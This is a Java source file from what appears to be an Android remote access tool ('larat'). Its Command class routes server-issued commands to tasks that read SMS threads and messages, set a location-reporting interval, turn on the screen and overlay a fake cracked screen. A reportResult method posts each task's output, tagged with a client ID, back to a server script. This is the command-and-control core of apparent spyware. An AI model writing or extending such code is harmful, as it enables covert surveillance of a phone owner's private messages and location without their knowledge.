package com.c4wd.commands;

import android.os.AsyncTask;

import com.c4wd.larat.Constants;
import com.c4wd.larat.RestClient;
import com.loopj.android.http.RequestParams;

import java.util.HashMap;

/**
 * Created by cory on 10/4/15.
 */
public class Command {

    private static HashMap<String, Class<? extends AsyncTask>> commandList;

    public static Class<?> getTask(String id) {
        return Command.commandList.get(id);
    }

    public static void initCommands() {
        if (Command.commandList == null) {
            Command.commandList = new HashMap<String, Class<? extends AsyncTask>>();
            //Adding commands is simple
            //commandList.put("String of command that is sent from the server", new Task.class);

            commandList.put("ScreenOn", GenericTasks.ScreenOnTask.class);
            commandList.put("SetLocationInterval", GenericTasks.SetLocationIntervalTask.class);
            commandList.put("Toast", GenericTasks.ToastTask.class);
            //drawing tasks
            commandList.put("OpenGL", DrawingTasks.OpenGLViewTask.class);
            commandList.put("Pong", DrawingTasks.PongTask.class);
            commandList.put("ScreenCrack", DrawingTasks.CrackScreenTask.class);
            commandList.put("ClearViews", DrawingTasks.ClearViewTask.class);
            //sms tasks
            commandList.put("CacheThread", SMSCommands.CacheThreadIdTask.class);
            commandList.put("GetMessages", SMSCommands.GetMessagesTask.class);
            commandList.put("GetThreads", SMSCommands.GetThreadsTask.class);
        }
    }

    public static void reportResult(String result) {
        RequestParams params = new RequestParams();
        params.put("command", "addMessage");
        params.put("client_id", Constants.CLIENT_ID);
        params.put("message_type", "COMMAND_COMPLETED");
        params.put("message", result);
        RestClient.post("client_command.php", params);
    }
}
